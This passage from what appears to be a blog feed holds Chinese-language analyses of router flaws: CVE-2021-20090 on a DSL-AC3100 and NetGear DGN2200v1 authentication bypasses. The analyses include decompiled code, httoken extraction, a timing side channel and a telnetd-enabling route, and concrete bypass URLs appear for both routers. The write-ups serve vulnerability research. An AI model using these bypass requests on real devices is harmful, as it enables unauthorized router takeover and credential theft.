class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    uVar2 = <span class="hljs-built_in">FUN_0001d0c0</span>(iParm3); <br>    <span class="hljs-keyword">return</span> uVar2;<br>  &#125;<br>  <span class="hljs-built_in">FUN_00014510</span>(iParm3,<span class="hljs-number">0x193</span>,<span class="hljs-string">&quot;Unauthorized.&quot;</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>FUN_0001d578() 函数中的 FUN_0001d2e0() 是使用正则表达式来校验URL中的IP，端口是否符合规范。以及FUN_0001d0c0() 函数也在其中，因此这个函数是httpd 中来做身份验证的函数，也就是漏洞分析中的evaluate_access()。</p><p>接下来我们来查看调用evaluate_access() 函数的地方，真正的漏洞点在这个函数，我们来看漏洞点是如何绕过身份验证的。我们来到了FUN_00015058函数，这就是process_request 的函数。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">FUN_00015058</span><span class="hljs-params">(<span class="hljs-type">int</span> iParm1)</span></span><br><span class="hljs-function"></span><br><span class="hljs-function"></span>&#123;<br>  undefined4 uVar1;<br>  <span class="hljs-type">char</span> *pcVar2;<br>  <span class="hljs-type">char</span> *__src;<br>  <span class="hljs-type">int</span> iVar3;<br>  <span class="hljs-type">char</span> *__dest;<br>  <br>  iVar3 = iParm1 + <span class="hljs-number">0xd5</span>;<br>  uVar1 = <span class="hljs-built_in">FUN_00016a84</span>(iVar3,<span class="hljs-number">0xd</span>);<br>  *(undefined4 *)(iParm1 + <span class="hljs-number">0x27f0</span>) = uVar1;<br>  *(undefined4 *)(iParm1 + <span class="hljs-number">0x76a4</span>) = <span class="hljs-number">0xffffffff</span>;<br>  *(undefined4 *)(iParm1 + <span class="hljs-number">0x76ac</span>) = <span class="hljs-number">0xffffffff</span>;<br>  __src = (<span class="hljs-type">char</span> *)<span class="hljs-built_in">FUN_00016a84</span>(iVar3,<span class="hljs-number">0x20</span>);<br>  *(<span class="hljs-type">int</span> *)(iParm1 + <span class="hljs-number">0x7b18</span>) = iVar3;<br>  pcVar2 = (<span class="hljs-type">char</span> *)<span class="hljs-built_in">FUN_00016a84</span>(__src,<span class="hljs-number">0x20</span>);<br>  uVar1 = <span class="hljs-built_in">FUN_00016a84</span>(__src,<span class="hljs-number">0x3f</span>);<br>  *(undefined4 *)(iParm1 + <span class="hljs-number">0x7b14</span>) = uVar1;<br>  __dest = (<span class="hljs-type">char</span> *)(iParm1 + <span class="hljs-number">0x7994</span>);<br>  <span class="hljs-built_in">strncpy</span>(__dest,__src,<span class="hljs-number">0xff</span>);<br>  *(undefined *)(iParm1 + <span class="hljs-number">0x7a93</span>) = <span class="hljs-number">0</span>;<br>  <span class="hljs-built_in">FUN_00016e3c</span>(__dest);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[%s] url=[%s], args=[%s], method=[%s]\n&quot;</span>,<span class="hljs-string">&quot;process_request&quot;</span>,__dest,<br>         *(undefined4 *)(iParm1 + <span class="hljs-number">0x7b14</span>),*(undefined4 *)(iParm1 + <span class="hljs-number">0x7b18</span>));<br>  iVar3 = <span class="hljs-built_in">FUN_00018c70</span>(iParm1);<br>  <span class="hljs-keyword">if</span> (iVar3 &lt; <span class="hljs-number">0</span>) &#123;<br>    <span class="hljs-keyword">return</span>;<br>  &#125;<br>  <span class="hljs-keyword">if</span> (*pcVar2 == <span class="hljs-string">&#x27;\0&#x27;</span>) &#123;<br>    *(undefined4 *)(iParm1 + <span class="hljs-number">0x7988</span>) = <span class="hljs-number">1</span>;<br>  &#125;<br>  <span class="hljs-keyword">else</span> &#123;<br>    *(undefined4 *)(iParm1 + <span class="hljs-number">0x7988</span>) = <span class="hljs-number">0</span>;<br>    iVar3 = <span class="hljs-built_in">FUN_00018cb8</span>(iParm1);<br>    <span class="hljs-keyword">if</span> (iVar3 &lt; <span class="hljs-number">0</span>) &#123;<br>      <span class="hljs-keyword">return</span>;<br>    &#125;<br>    iVar3 = <span class="hljs-built_in">strncasecmp</span>(*(<span class="hljs-type">char</span> **)(iParm1 + <span class="hljs-number">0x7620</span>),<span class="hljs-string">&quot;multipart/form-data&quot;</span>,<span class="hljs-number">0x13</span>);<br>    <span class="hljs-keyword">if</span> ((((iVar3 != <span class="hljs-number">0</span>) &amp;&amp; (*(<span class="hljs-type">char</span> **)(iParm1 + <span class="hljs-number">0x7b24</span>) != (<span class="hljs-type">char</span> *)<span class="hljs-number">0x0</span>)) &amp;&amp;<br>        (__src = <span class="hljs-built_in">strcasestr</span>(*(<span class="hljs-type">char</span> **)(iParm1 + <span class="hljs-number">0x7b24</span>),<span class="hljs-string">&quot;FirmwareUpload&quot;</span>), __src == (<span class="hljs-type">char</span> *)<span class="hljs-number">0x0</span>))&amp;&amp;<br>       (<span class="hljs-number">0</span> &lt; (<span class="hljs-type">int</span>)(*(<span class="hljs-type">int</span> *)(iParm1 + <span class="hljs-number">0x7984</span>) + (uint)(<span class="hljs-number">64000</span> &lt; *(uint *)(iParm1 + <span class="hljs-number">0x7980</span>))))) &#123;<br>      <span class="hljs-built_in">FUN_0000bef4</span>(iParm1,*(undefined4 *)(iParm1 + <span class="hljs-number">0xc</span>));<br>      <span class="hljs-built_in">FUN_00014510</span>(iParm1,<span class="hljs-number">0x193</span>,<span class="hljs-string">&quot;The Content-length is extreme large!&quot;</span>);<br>      <span class="hljs-keyword">return</span>;<br>    &#125;<br>  &#125;<br>  uVar1 = <span class="hljs-built_in">FUN_0000deb0</span>(__dest);<br>  *(undefined4 *)(iParm1 + <span class="hljs-number">0x76a8</span>) = uVar1;<br>  <span class="hljs-comment">// evaluate_access()</span><br>  <span class="hljs-keyword">if</span> (((*(code **)(PTR_PTR_DAT_00054fac + <span class="hljs-number">0x14</span>) == (code *)<span class="hljs-number">0x0</span>) ||<br>      (iVar3 = (**(code **)(PTR_PTR_DAT_00054fac + <span class="hljs-number">0x14</span>))(iParm1), iVar3 != <span class="hljs-number">2</span>)) &amp;&amp;<br>     ((*(<span class="hljs-type">int</span> *)(iParm1 + <span class="hljs-number">0x76a8</span>) != <span class="hljs-number">0</span> || (iVar3 = <span class="hljs-built_in">FUN_0001d578</span>(__dest,<span class="hljs-number">0</span>,iParm1), iVar3 == <span class="hljs-number">0</span>)))) &#123;<br>    *(undefined4 *)(iParm1 + <span class="hljs-number">0x798c</span>) = <span class="hljs-number">0</span>;<br>    __src = *(<span class="hljs-type">char</span> **)(iParm1 + <span class="hljs-number">0x7b18</span>);<br>    iVar3 = <span class="hljs-built_in">strcmp</span>(__src,<span class="hljs-string">&quot;HEAD&quot;</span>);<br>    <span class="hljs-keyword">if</span> (iVar3 == <span class="hljs-number">0</span>) &#123;<br>      *(undefined4 *)(iParm1 + <span class="hljs-number">0x798c</span>) = <span class="hljs-number">1</span>;<br>      <span class="hljs-keyword">if</span> (*(<span class="hljs-type">int</span> *)(iParm1 + <span class="hljs-number">0x7988</span>) == <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-built_in">FUN_0000eb98</span>(iParm1);<br>      &#125;<br>      <span class="hljs-keyword">else</span> &#123;<br>        *(undefined4 *)(iParm1 + <span class="hljs-number">0x798c</span>) = <span class="hljs-number">0</span>;<br>        <span class="hljs-built_in">FUN_00014510</span>(iParm1,<span class="hljs-number">400</span>,<span class="hljs-string">&quot;Invalid HTTP/0.9 method.&quot;</span>);<br>      &#125;<br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>      iVar3 = <span class="hljs-built_in">strcmp</span>(__src,<span class="hljs-string">&quot;GET&quot;</span>);<br>      <span class="hljs-keyword">if</span> (iVar3 == <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-built_in">FUN_0000eb98</span>(iParm1);<br>      &#125;<br>      <span class="hljs-keyword">else</span> &#123;<br>        iVar3 = <span class="hljs-built_in">strcmp</span>(__src,<span class="hljs-string">&quot;POST&quot;</span>);<br>        <span class="hljs-keyword">if</span> (iVar3 == <span class="hljs-number">0</span>) &#123;<br>          <span class="hljs-built_in">FUN_00014c30</span>(iParm1);<br>        &#125;<br>        <span class="hljs-keyword">else</span> &#123;<br>          <span class="hljs-built_in">FUN_00014510</span>(iParm1,<span class="hljs-number">400</span>,<span class="hljs-string">&quot;Invalid or unsupported method.&quot;</span>);<br>        &#125;<br>      &#125;<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">return</span>;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>&amp;&amp; ： 逻辑与，前后条件同时满足表达式为真；</p><p>|| ： 逻辑与，前后条件只要有一个满足表达式为真。 </p></blockquote><p>如下面的代码，因为逻辑运算符&amp;&amp; 的优先级大于 || ，因此会先计算 &amp;&amp; 的值。所以要先判断 iParm1 + 0x76a8 的值。如果值不为0 ，则接着执行 逻辑运算符的|| 的表达式。</p><p>(((*(code **)(PTR_PTR_DAT_00054fac + 0x14) &#x3D;&#x3D; (code *)0x0) ||<br>      (iVar3 &#x3D; (**(code **)(PTR_PTR_DAT_00054fac + 0x14))(iParm1), iVar3 !&#x3D; 2)) &amp;&amp;<br>     ((*(int *)(iParm1 + 0x76a8) !&#x3D; 0 || (iVar3 &#x3D; FUN_0001d578(__dest,0,iParm1), iVar3 &#x3D;&#x3D; 0))))</p><p>根据 FUN_00015058() 函数的代码，可以看到 iParm1 + 0x76a8 的值是从  FUN_0000deb0(__dest) 获取到的，而 “_dest” 的值在前面可以看出来是用户请求的 URL。</p><p>如果 iParm1 + 0x76a8 不为0 ，那么就能跳过身份验证的函数**evaluate_access()**，来直接执行处理POST请求的FUN_00014c30函数。 </p><p>接下来进入 FUN_0000deb0() 函数，来查看是怎么处理 URL，</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">undefined4</span> FUN_0000deb0(char *pcParm1)<br><br>&#123;<br>  <span class="hljs-attribute">size_t</span> __n;<br>  <span class="hljs-attribute">int</span> iVar1;<br>  <span class="hljs-attribute">char</span> *__s;<br>  <span class="hljs-attribute">undefined</span> **ppuVar2;<br>  <br>  <span class="hljs-attribute">ppuVar2</span> = &amp;PTR_s_/images/_00054f70;<br>  <span class="hljs-attribute">__s</span> = PTR_s_/images/_00054f70;<br>  <span class="hljs-attribute">if</span> (PTR_s_/images/_00054f70 == (undefined *)0x0) &#123;<br>    <span class="hljs-attribute">return</span> <span class="hljs-number">0</span>;<br>  &#125;<br>  <span class="hljs-section">do</span> &#123;<br>    <span class="hljs-attribute">__n</span> = strlen(__s);<br>    <span class="hljs-attribute">iVar1</span> = strncasecmp(pcParm1,__s,__n);<br>    <span class="hljs-attribute">if</span> (iVar1 == <span class="hljs-number">0</span>) &#123;<br>      <span class="hljs-attribute">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br>    <span class="hljs-attribute">ppuVar2</span> = ppuVar2 + <span class="hljs-number">1</span>;<br>    <span class="hljs-attribute">__s</span> = *ppuVar2;<br>  &#125; <span class="hljs-attribute">while</span> (*ppuVar2 != (char *)0x0);<br>  <span class="hljs-attribute">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>函数会将 url 和  &amp;PTR_s_&#x2F;images&#x2F;<em>00054f70 字符串进行比较，直到符合为止，而 &amp;PTR_s</em>&#x2F;images&#x2F;_00054f70  的值是 “&#x2F;images&#x2F;” ，所以只需要请求的URL中带有  “&#x2F;images&#x2F;” 字符串，就可以绕过身份认证函数访问其他页面。</p><p><img src="/CVE-2021-20090(%E5%8D%8E%E7%A1%95DSL-AC3100)%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.assets/image-20210815170700457.png" alt="image-20210815170700457"></p><p><img src="/CVE-2021-20090(%E5%8D%8E%E7%A1%95DSL-AC3100)%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.assets/image-20210815170721467.png" alt="image-20210815170721467"></p><p>前面已经分析出来了身份验证绕过的漏洞点，但是并不能绕过验证访问任意界面，因为在访问的时候，需要正确的httoken值。接下来我们来分析设备的httoken 是怎么获取和生成的，在这个设备里，httoken 是设备的token值，并且访问设备的页面需要带有给定的httoken 值。根据漏洞披露来看，httoken 是在服务端进行生成，然后前端js 中进行解密，最终向服务器请求的时候，将httoken加入到请求数据中，但是漏洞披露并没有说明httoken 是那一段字符串生成的。</p><p>我在httpd 的逆向工程中找到了生成httoken 的函数，</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function">undefined4 <span class="hljs-title">FUN_00022520</span><span class="hljs-params">(<span class="hljs-type">int</span> iParm1)</span></span><br><span class="hljs-function"></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-type">int</span> iVar1;<br>  undefined4 uVar2;<br>  undefined *puVar3;<br>  <span class="hljs-type">size_t</span> sVar4;<br>  <span class="hljs-type">char</span> cStack120;<br>  undefined auStack119 [<span class="hljs-number">107</span>];<br>  <br>  <span class="hljs-built_in">memset</span>(&amp;cStack120,<span class="hljs-number">0</span>,<span class="hljs-number">0x65</span>);<br>  iVar1 = <span class="hljs-built_in">FUN_00017df0</span>();<br>  <span class="hljs-keyword">if</span> (iVar1 == <span class="hljs-number">-1</span>) &#123;<br>    uVar2 = <span class="hljs-number">0</span>;<br>  &#125;<br>  <span class="hljs-keyword">else</span> &#123;<br>    puVar3 = (undefined *)(iParm1 + <span class="hljs-number">0x7994</span>);<br>    <span class="hljs-keyword">if</span> (puVar3 == (undefined *)<span class="hljs-number">0x0</span>) &#123;<br>      puVar3 = &amp;DAT_0003d274;<br>    &#125;<br>    uVar2 = <span class="hljs-built_in">FUN_000393e0</span>(puVar3);<br>    <span class="hljs-built_in">sprintf</span>(&amp;cStack120,<span class="hljs-string">&quot;%lu&quot;</span>,uVar2);<br>    sVar4 = <span class="hljs-built_in">strlen</span>(&amp;cStack120);<br>    <span class="hljs-built_in">FUN_00017e78</span>(&amp;cStack120,sVar4,auStack119 + sVar4,<span class="hljs-number">100</span> - sVar4);<br>    uVar2 = <span class="hljs-built_in">so_printf</span>(iParm1,<br>                      <span class="hljs-string">&quot;&lt;img title=spacersrc=\&quot;data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7%s\&quot; border=0&gt;&quot;</span><br>                      ,auStack119 + sVar4);<br>  &#125;<br>  <span class="hljs-keyword">return</span> uVar2;<br></code></pre></td></tr></table></figure><p>接下来我们来分析FUN_00022520函数。在函数中我们可以看到最终生成了一个img 标签，并且src 的值是一段“data:image&#x2F;gif;base64,R0lGODlhAQABAIAAAAAAAP&#x2F;&#x2F;&#x2F;yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 + auStack119 + sVar4 ”字符串，而其中 auStack119 + sVar4 的值是从FUN_00017e78 函数中进行base64 以及其他的方式进行处理后的字符串，并且这段字符串就是httoken的值。</p><p>生成的img 标签会在设备的login.html 中html 代码中出现，如下图所示，</p><p><img src="/CVE-2021-20090(%E5%8D%8E%E7%A1%95DSL-AC3100)%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.assets/image-20210816152015429.png" alt="image-20210816152015429"></p><p>根据生成httoken函数拼接这段字符串的方式，使用脚本对把token 解密出来，可以确定如下图的“372646849” 为设备的 token。</p><p>ArcBase.decode(“image&#x2F;gif;base64,R0lGODlhAQABAIAAAAAAAP&#x2F;&#x2F;&#x2F;yH5BAEAAAAALAAAAAABAAEAAAIBRAA7MTU2OTQzNDE0OA&#x3D;&#x3D;”）</p><p>根据解密出来的信息，“;” 后面的字符串 “ 372646849” 就是设备解密后的httoken 值。</p><h2 id="0x04-ping-命令注入-配置选项"><a href="#0x04-ping-命令注入-配置选项" class="headerlink" title="0x04 ping 命令注入+配置选项"></a>0x04 ping 命令注入+配置选项</h2><p>这一部分，漏洞披露的相对来说比较详细，很多的网络设备中在ping网络诊断 这个功能中，出现过大量的历史漏洞，比如NetGear，D-Link等都出现过此类漏洞，因此关于ping 这一步部分命令拼接就不展开来讲述，但是本漏洞的不同点在于使用设备内部的配置选项ARC_TELNETD_ENABLE 来开启设备的telentd，这一点可以在以后的漏洞挖掘中遇到无法执行命令的时候，提供了不同的执行命令的方式。<br>我们来重点的关注一下ARC_TELNETD_ENABLE 这个配置。在文件 &#x2F;sbin&#x2F;arc_telnetd 文件中可以看到文件内容。文件可以获取ARC_TELNETD_ENABLE的值，当ARC_TELNETD_ENABLE的值为1的时候，设备会开启telnetd。</p><p><img src="/CVE-2021-20090(%E5%8D%8E%E7%A1%95DSL-AC3100)%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.assets/image-20210815163855557.png" alt="image-20210815163855557"></p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p><img src="/CVE-2021-20090(%E5%8D%8E%E7%A1%95DSL-AC3100)%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.assets/image-20210817151131987.png" alt="image-20210817151131987"></p><p><img src="/CVE-2021-20090(%E5%8D%8E%E7%A1%95DSL-AC3100)%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.assets/image-20210817151237633-1702730737615.png" alt="image-20210817151237633"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>NetGear__DNG2200v1系列漏洞分析</title>
    <link href="/2023/12/16/NetGear_DGN2200v1%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <url>/2023/12/16/NetGear_DGN2200v1%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<h1 id="NetGear-DGN2200v1系列漏洞分析"><a href="#NetGear-DGN2200v1系列漏洞分析" class="headerlink" title="NetGear DGN2200v1系列漏洞分析"></a>NetGear DGN2200v1系列漏洞分析</h1><h3 id="获取和解压固件"><a href="#获取和解压固件" class="headerlink" title="获取和解压固件"></a>获取和解压固件</h3><p>固件可从供应商的网站上获得，这使我们更容易获得副本进行检查。它是一个简单的 .zip 文件，包含发行说明 (.html) 和固件映像本身（.chk 文件）。在 .chk 文件上运行binwalk最终提取了文件系统 ( squash-fs )。</p><p><img src="/NetGear2200v1%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.assets/image1.png" alt="image-20231216202735932"></p><p>由器固件文件系统本身是一个标准的 Linux 根文件系统，并添加了一些小功能。我们关心和研究有以下几点</p><ul><li>&#x2F;www  –  包含html页面和.gif图片</li><li>&#x2F;usr&#x2F;sbin – 包含 NETGEAR 的各种自定义二进制文件，包括 HTTPd、FTPC 等</li></ul><p>由于我们看到异常通信使用 httpd 服务的标准端口，因此我们将重点放在 httpd 上。httpd 本身是一个 32 位大端 MIPS ELF，针对 uClibc (嵌入式设备的标准 libc）编译，似乎整个服务器端逻辑 (CGI) 都被编译到 httpd 中。</p><p><img src="/NetGear2200v1%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.assets/image2.png" alt="image-20231216202735932"></p><h3 id="探索"><a href="#探索" class="headerlink" title="探索"></a>探索</h3><p>在探索嵌入式web服务时，首先要考虑以下几个问题</p><ol><li>Web 服务是否显示一些未经身份验证的页面？如果是这样，他们是如何治理的？</li><li>Web 服务如何执行身份验证？</li><li>Web服务是否正确处理请求（即是否存在内存损坏错误）？</li><li>Web 服务是否实施了某些安全措施，例如（反）跨站点请求伪造令牌或内容安全策略？</li></ol><p>为了回答这些问题，我们对 httpd 二进制文件进行了静态分析，并通过运行 QEMU（一个开源模拟器）对固件进行仿真模拟，另外使用了hook（例如 NVRAM getter 和 setter）进行了一些动态分析。</p><h3 id="DGN-2200V1路由器中存在的漏洞"><a href="#DGN-2200V1路由器中存在的漏洞" class="headerlink" title="DGN 2200V1路由器中存在的漏洞"></a>DGN 2200V1路由器中存在的漏洞</h3><h4 id="绕过身份验证访问路由器管理界面"><a href="#绕过身份验证访问路由器管理界面" class="headerlink" title="绕过身份验证访问路由器管理界面"></a>绕过身份验证访问路由器管理界面</h4><p>在检查 httpd 如何规定哪些页面应该在没有身份验证的情况下提供时，我们发现了以下伪代码：</p><p><img src="/NetGear2200v1%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.assets/image3.png" alt="image-20231216202735932"></p><p>这些代码是httpd中的第一个页面处理代码，它会自动允许一些页面，例如form.css或者func.js，正常来说，这些设置并没有问题，但是异常点在于NetGear使用strstr函数来检查是否有“.jpg”“.gif”或者“ess_“字符串，用来匹配整个 url 。<br>因此我们可以使用GET 方式在URL中带有strstr检查的字符串（如 “?.gif” ）来访问设备的任意界面，其中包括身份验证的界面，使用如下</p><p><code>https://ip/WAN_wan.htm?pic.gif</code></p><p>就可以成功绕过身份验证访问路由器管理界面了。</p><h4 id="通过加密侧信道攻击推断路由器凭证"><a href="#通过加密侧信道攻击推断路由器凭证" class="headerlink" title="通过加密侧信道攻击推断路由器凭证"></a>通过加密侧信道攻击推断路由器凭证</h4><p>在这个阶段，我们已经完全控制了路由器管理界面，但是我们继续研究身份验证本身是如何实现的。<br>我们注意到httpd 组件对http界面进行基础认证，需要将username和password 使用base64来进行编译，然后在http header中发送，最后在路由器内存中保存的用户名和密码进行验证，路由器将这些信息存储在NVRAM中。<br>在我们检查身份验证的过程中，我们发现了一种可以让攻击者获取正确凭据的旁道攻击：</p><p><img src="/NetGear2200v1%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.assets/image4.png" alt="image-20231216202735932"></p><p>这里要注意，username 和 password 是使用strcmp来进行比较的，strcmp 在 libc 中的实现是通过逐个字符比较直到观察到 NUL 终止符或直到发生不匹配来工作。</p><p>攻击者可以通过测量失败所需的时间来利用后者。例如，在测量第一个字符的次数时，我们得到如下图：</p><p><img src="/NetGear2200v1%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.assets/image5.png" alt="image-20231216202735932"></p><p>这表示第一个字符是“n”。攻击者可以重复此过程（“na”、“nb”、“nc”等）以获取第二个字符，直到泄露整个用户名和密码。</p><p>我们向 NETGEAR 建议他们可以通过执行基于 XOR 的内存比较来避免此类攻击，例如：</p><p><img src="/NetGear2200v1%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.assets/image6.png" alt="image-20231216202735932"></p><p>使字节不匹配，该功能也会继续。类似的方法可以在加密安全库中看到，例如OpenSSL 的 CRYPTO_memcmp。</p><h4 id="检索存储在设备中的密钥"><a href="#检索存储在设备中的密钥" class="headerlink" title="检索存储在设备中的密钥"></a>检索存储在设备中的密钥</h4><p>当完成身份验证绕过漏洞之后，我们仍然想看看是否可以利用其他现有的漏洞来恢复路由器使用的username和密码，因为我们决定使用路由器的配置备份\恢复功能。<br>我们可以使用身份绕过获取文件：<br><code> hxxp://router_addr:8080/NETGEAR_DGN2200[.]cfg?pic[.]gif.</code><br>这个文件具有高熵，这表明它已被加密，我们无法直接读取内容，并且binwalk也没有任何结果。</p><p><img src="/NetGear2200v1%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.assets/image7.png" alt="image-20231216202735932"></p><p>当我们对“备份\恢复“的功能进行逆向后，我们的问题被解决了。</p><p><img src="/NetGear2200v1%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.assets/image8.png" alt="image-20231216202735932"></p><h3 id="拓展"><a href="#拓展" class="headerlink" title="拓展"></a>拓展</h3><h4 id="Ex6100v2-固件分析"><a href="#Ex6100v2-固件分析" class="headerlink" title="Ex6100v2 固件分析"></a>Ex6100v2 固件分析</h4><p>看完这边漏洞分析文章之后，根据以往对Netgear固件分析中，发现这种情况存在许多版本的固件中，于是我翻出了实验室的NetGear Ex6100v2 路由设备，下载到对应版本的固件，然后对固件进行解包分析，<br>根据&#x2F;etc&#x2F;init.d&#x2F;rcS文件中的内容<br>找到uhttpd 的组件（<br>uHTTPd 是一个 OpenWrt&#x2F;LUCI 开发者从头编写的 Web 服务器），可以看到这个固件是使用NX的保护措施。</p><p><img src="/NetGear2200v1%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.assets/image9.png" alt="image-20231216202735932"></p><p>在我分析&#x2F;etc&#x2F;boot文件中，看到如下内容，也可以证明这是一个OpenWRT类型的web组件。</p><p><img src="/NetGear2200v1%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.assets/image10.png" alt="image-20231216202735932"></p><p>在uhttpd组件的逆向中，看到了如下的伪代码</p><p><img src="/NetGear2200v1%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.assets/image11.png" alt="image-20231216202735932"></p><p>本来以为这也是一个存在身份验证绕过的固件，但是继续查看引用，看到这个函数需要在用户认证之后才会触发</p><p><img src="/NetGear2200v1%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.assets/image12.png" alt="image-20231216202735932"></p><p>于是在经过实际的测试，确实是需要在经过认证才能访问（鸡肋）</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Linksys EA6100 固件解密过程</title>
    <link href="/2023/12/16/Linksys_EA6100_%E5%9B%BA%E4%BB%B6%E8%A7%A3%E5%AF%86%E5%88%86%E6%9E%90/"/>
    <url>/2023/12/16/Linksys_EA6100_%E5%9B%BA%E4%BB%B6%E8%A7%A3%E5%AF%86%E5%88%86%E6%9E%90/</url>
    
